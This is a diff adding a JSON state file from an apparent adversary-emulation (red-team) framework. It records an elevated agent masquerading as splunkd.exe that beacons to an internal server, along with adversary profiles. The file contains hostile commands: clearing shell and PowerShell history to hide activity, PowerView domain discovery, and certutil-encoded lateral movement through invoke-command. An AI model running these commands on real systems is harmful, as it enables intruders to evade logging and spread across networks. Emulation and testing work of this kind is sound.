@@ -1,0 +1,215 @@
+{
+  "selected_agent": {
+    "paw": "fgdafj",
+    "sleep_min": 30,
+    "sleep_max": 60,
+    "watchdog": 0,
+    "group": "red",
+    "architecture": "amd64",
+    "platform": "windows",
+    "server": "http://192.168.30.45:8888",
+    "upstream_dest": "http://192.168.30.45:8888",
+    "username": "WS10\\Administrator",
+    "location": "C:\\Users\\Public\\splunkd.exe",
+    "pid": 6676,
+    "ppid": 8956,
+    "trusted": true,
+    "executors": [
+      "cmd",
+      "psh",
+      "proc"
+    ],
+    "privilege": "Elevated",
+    "exe_name": "splunkd.exe",
+    "host": "WS10",
+    "contact": "HTTP",
+    "proxy_receivers": {},
+    "proxy_chain": [],
+    "origin_link_id": "",
+    "deadman_enabled": true,
+    "available_contacts": [
+      "HTTP"
+    ],
+    "host_ip_addrs": [
+      "192.168.30.24"
+    ],
+    "display_name": "WS10$WS10\\Administrator",
+    "created": "2026-04-01T13:44:55Z",
+    "last_seen": "2026-04-02T07:28:27Z",
+    "links": [
+      {
+        "id": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+        "paw": "fgdafj",
+        "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "status": 0,
+        "score": 0,
+        "jitter": 0,
+        "decide": "2026-04-01T13:44:55Z",
+        "pin": 0,
+        "pid": "9040",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+        "collect": "2026-04-01T13:44:55Z",
+        "finish": "2026-04-01T13:44:55Z",
+        "ability": {
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "tactic": "defense-evasion",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "technique_id": "T1070.003",
+          "name": "Avoid logs",
+          "description": "Stop terminal from logging history",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "sh",
+              "platform": "linux",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Clear-History;Clear",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:44:56Z"
+      }
+    ],
+    "pending_contact": "HTTP",
+    "status": "alive"
+  },
+  "selected_adversary": {
+    "adversary_id": "c220a8e6-609c-4d5b-9e1c-068ca01c2eec",
+    "name": "Lateral Movement - Certutil",
+    "description": "discovers lateral hosts,, encodes binary into certificate for stealthy lateral-movement across the network",
+    "atomic_ordering": [
+      "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+      "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "96d3c175-5e58-424c-8350-d7514b28a075"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "plugin": "stockpile"
+  },
+  "operation_adversary": {
+    "adversary_id": "temp-seed-fgdafj-1775114934",
+    "name": "Temp Seed Windows - Lateral Movement - Certutil",
+    "description": "Auto-generated seed adversary from c220a8e6-609c-4d5b-9e1c-068ca01c2eec for agent fgdafj",
+    "atomic_ordering": [
+      "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+      "96d3c175-5e58-424c-8350-d7514b28a075"
+    ]
+  },
+  "temp_adversary_info": {
+    "saved": true,
+    "adversary": {
+      "adversary_id": "temp-seed-fgdafj-1775114934",
+      "name": "Temp Seed Windows - Lateral Movement - Certutil",
+      "description": "Auto-generated seed adversary from c220a8e6-609c-4d5b-9e1c-068ca01c2eec for agent fgdafj",
+      "atomic_ordering": [
+        "13379ae1-d20e-4162-91f8-320d78a35e7f",
+        "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+        "96d3c175-5e58-424c-8350-d7514b28a075"
+      ]
+    },
+    "selected_abilities": [
+      {
+        "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
+        "name": "Discover local hosts",
+        "tactic": "discovery",
+        "technique_id": "T1018",
+        "noisy_score": 3,
+        "command_preview": "Import-Module .\\powerview.ps1; Get-DomainComputer"
+      },
+      {
+        "ability_id": "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+        "name": "Local FQDN",
+        "tactic": "discovery",
+        "technique_id": "TA0007",
+        "noisy_score": 3,
+        "command_preview": "[System.Net.Dns]::GetHostByName($env:computerName).HostName"
+      },
+      {
+        "ability_id": "96d3c175-5e58-424c-8350-d7514b28a075",
+        "name": "Lateral Movement - Certutil",
+        "tactic": "lateral-movement",
+        "technique_id": "T1570",
+        "noisy_score": 2,
+        "command_preview": "certutil -encode #{location} C:\\users\\public\\com.crt | out-null; invoke-command #{remote.host.fqdn}…"
+      }
+    ]
+  }
+}
